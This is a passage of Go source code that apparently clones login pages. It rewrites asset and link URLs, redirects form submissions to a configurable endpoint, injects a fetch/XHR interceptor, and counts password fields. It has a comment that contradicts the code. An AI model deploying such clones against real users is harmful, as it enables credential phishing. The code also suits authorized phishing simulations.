		return "asset.bin"
	}
	if len(s) > 80 {
		s = s[:80]
	}
	return s
}

// ---------------------------------------------------------------------------
// URL rewriting

func skipScheme(raw string) bool {
	low := strings.ToLower(strings.TrimSpace(raw))
	if low == "" || strings.HasPrefix(low, "#") {
		return true
	}
	for _, p := range []string{"javascript:", "data:", "mailto:", "tel:", "blob:", "about:", "vbscript:"} {
		if strings.HasPrefix(low, p) {
			return true
		}
	}
	// Template syntax is not a URL; leave it for the framework.
	if strings.Contains(raw, "{{") || strings.Contains(raw, "${") {
		return true
	}
	return false
}

func resolveURL(base *url.URL, raw string) (*url.URL, bool) {
	if skipScheme(raw) {
		return nil, false
	}
	u, err := url.Parse(strings.TrimSpace(raw))
	if err != nil {
		return nil, false
	}
	return base.ResolveReference(u), true
}

func stripFragment(s string) string {
	if i := strings.IndexByte(s, '#'); i >= 0 {
		return s[:i]
	}
	return s
}

func sameHost(u *url.URL, base *url.URL) bool {
	return strings.EqualFold(u.Host, base.Host)
}

func quoted(v string) string {
	return `"` + html.EscapeString(v) + `"`
}

func rewriteHTML(doc []byte, base *url.URL, opts Options, assets map[string]Asset) []byte {
	s := string(doc)
	base = pageBase(base, doc)

	// <link href> is always an asset reference.
	s = linkTagRe.ReplaceAllStringFunc(s, func(tag string) string {
		return replaceTagAttr(tag, "href", func(v string) (string, bool) {
			return rewriteAsset(base, opts, assets, v)
		})
	})
	// Navigation links stay on the clone when they are same-origin; external
	// links are kept absolute so the clone does not pretend to own them.
	s = anchorTagRe.ReplaceAllStringFunc(s, func(tag string) string {
		return replaceTagAttr(tag, "href", func(v string) (string, bool) {
			return rewriteNav(base, opts, v)
		})
	})
	// Images, scripts, media, and form targets.
	s = genericAttr.ReplaceAllStringFunc(s, func(m string) string {
		sub := genericAttr.FindStringSubmatch(m)
		if len(sub) < 5 {
			return m
		}
		name := strings.ToLower(sub[1])
		v := sub[2]
		if v == "" {
			v = sub[3]
		}
		if v == "" {
			v = sub[4]
		}
		var out string
		var ok bool
		switch name {
		case "action", "formaction":
			out, ok = rewriteAction(base, opts, v)
		default:
			out, ok = rewriteAsset(base, opts, assets, v)
		}
		if !ok {
			return m
		}
		return name + "=" + quoted(out)
	})
	// srcset candidates.
	s = srcsetRe.ReplaceAllStringFunc(s, func(m string) string {
		sub := srcsetRe.FindStringSubmatch(m)
		if len(sub) < 3 {
			return m
		}
		v := sub[1]
		if v == "" {
			v = sub[2]
		}
		return "srcset=" + quoted(rewriteSrcset(base, opts, assets, v))
	})
	// CSS inside <style> and style attributes.
	s = styleRe.ReplaceAllStringFunc(s, func(block string) string {
		m := styleRe.FindStringSubmatch(block)
		if len(m) < 4 {
			return block
		}
		return m[1] + rewriteCSS(m[2], base, opts, assets) + m[3]
	})
	s = styleAttr.ReplaceAllStringFunc(s, func(m string) string {
		sub := styleAttr.FindStringSubmatch(m)
		if len(sub) < 3 {
			return m
		}
		v := sub[1]
		if v == "" {
			v = sub[2]
		}
		return `style="` + html.EscapeString(rewriteCSS(html.UnescapeString(v), base, opts, assets)) + `"`
	})
	// Rewrite a <base href> so the clone's own origin wins.
	if opts.BaseURL != "" {
		s = baseTagRe.ReplaceAllString(s,
			`<base href="`+html.EscapeString(strings.TrimRight(opts.BaseURL, "/"))+`/">`)
	}
	return []byte(s)
}

func replaceTagAttr(tag, name string, fn func(string) (string, bool)) string {
	re := regexp.MustCompile(`(?is)(\b` + regexp.QuoteMeta(name) + `\s*=\s*)(?:"([^"]*)"|'([^']*)'|([^\s>]+))`)
	return re.ReplaceAllStringFunc(tag, func(m string) string {
		sub := re.FindStringSubmatch(m)
		if len(sub) < 5 {
			return m
		}
		v := sub[2]
		if v == "" {
			v = sub[3]
		}
		if v == "" {
			v = sub[4]
		}
		out, ok := fn(v)
		if !ok {
			return m
		}
		return sub[1] + quoted(out)
	})
}

func rewriteAsset(base *url.URL, opts Options, assets map[string]Asset, raw string) (string, bool) {
	u, ok := resolveURL(base, raw)
	if !ok {
		return "", false
	}
	abs := u.String()
	if a, ok := assets[stripFragment(abs)]; ok {
		return a.Path, true
	}
	return abs, true
}

func rewriteNav(base *url.URL, opts Options, raw string) (string, bool) {
	u, ok := resolveURL(base, raw)
	if !ok {
		return "", false
	}
	if opts.BaseURL == "" || !sameHost(u, base) {
		return u.String(), true
	}
	return joinCloneURL(opts.BaseURL, u), true
}

func rewriteAction(base *url.URL, opts Options, raw string) (string, bool) {
	if opts.FormAction != "" {
		return opts.FormAction, true
	}
	if strings.TrimSpace(raw) == "" {
		raw = "/"
	}
	u, ok := resolveURL(base, raw)
	if !ok {
		return "", false
	}
	if opts.FormActionBase == "" {
		return u.String(), true
	}
	return joinCloneURL(opts.FormActionBase, u), true
}

// joinCloneURL maps a same-origin absolute URL onto the portal base, keeping
// the path, query, and fragment.
func joinCloneURL(baseURL string, u *url.URL) string {
	out := strings.TrimRight(baseURL, "/") + u.EscapedPath()
	if u.RawQuery != "" {
		out += "?" + u.RawQuery
	}
	if u.Fragment != "" {
		out += "#" + u.Fragment
	}
	return out
}

func rewriteSrcset(base *url.URL, opts Options, assets map[string]Asset, v string) string {
	parts := strings.Split(v, ",")
	for i, p := range parts {
		fields := strings.Fields(strings.TrimSpace(p))
		if len(fields) == 0 {
			continue
		}
		if out, ok := rewriteAsset(base, opts, assets, fields[0]); ok {
			fields[0] = out
		}
		parts[i] = strings.Join(fields, " ")
	}
	return strings.Join(parts, ", ")
}

func rewriteCSS(css string, base *url.URL, opts Options, assets map[string]Asset) string {
	return cssURLRe.ReplaceAllStringFunc(css, func(m string) string {
		sub := cssURLRe.FindStringSubmatch(m)
		if len(sub) < 3 {
			return m
		}
		raw := strings.TrimSpace(sub[2])
		out, ok := rewriteAsset(base, opts, assets, raw)
		if !ok {
			return m
		}
		return `url("` + strings.NewReplacer(`\`, `\\`, `"`, `\"`, `(`, `\(`, `)`, `\)`).Replace(out) + `")`
	})
}

// ---------------------------------------------------------------------------
// SPA shim injection

// injectSPAShim inserts the SPA fetch/XHR interceptor just before </body> (or
// </html>, else appends). The shim is a <script> element, so it must never be
// placed inside an open <script> tag; the injection point is moved past any
// enclosing script block first.
func injectSPAShim(doc []byte, assetMap, apiMap map[string]string) []byte {
	// Inject as early as possible: SPA bundles often issue their first API
	// calls from <head> scripts, before a body-end shim would be installed.
	lower := bytes.ToLower(doc)
	idx := 0
	if h := bytes.Index(lower, []byte("<head")); h >= 0 {
		if end := bytes.IndexByte(doc[h:], '>'); end >= 0 {
			idx = h + end + 1
		}
	}
	block := spaShim(assetMap, apiMap)
	out := make([]byte, 0, len(doc)+len(block)+1)
	out = append(out, doc[:idx]...)
	out = append(out, block...)
	out = append(out, '\n')
	out = append(out, doc[idx:]...)
	return out
}

// fillDiagnostics records what a cloned page actually contains so the console
// can warn when the result is an empty shell rather than a login page.
func fillDiagnostics(r *Result) {
	if r == nil {
		return
	}
	body := strings.ToLower(string(r.Body))
	r.FormCount = strings.Count(body, "<form")
	r.PasswordCount = strings.Count(body, `type="password"`) + strings.Count(body, `type='password'`)
}
